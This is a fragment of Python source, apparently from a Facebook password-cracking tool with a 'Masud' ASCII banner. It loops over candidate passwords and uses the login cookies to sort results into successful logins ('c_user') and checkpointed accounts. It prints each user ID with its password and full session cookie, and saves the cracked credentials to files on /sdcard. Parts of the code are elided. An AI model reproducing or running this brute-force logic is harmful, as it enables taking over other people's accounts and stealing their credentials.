...
8888b   d8888                                 888      
88888b.d88888                                 888      
888Y88888P888  8888b.  .d8888b  888  888  .d88888      
888 Y888P 888     "88b 88K      888  888 d88" 888      
888  Y8P  888 .d888888 "Y8888b. 888  888 888  888      
888   "   888 888  888      X88 Y88b 888 Y88b 888      
888       888 "Y888888  88888P'  "Y88888  "Y88888      \033[1;37m\n""")
def ud():
    os.system('clear')
    jalan(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[Masud -OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Masud -OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[Masud -CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/Masud -CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[Masud ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
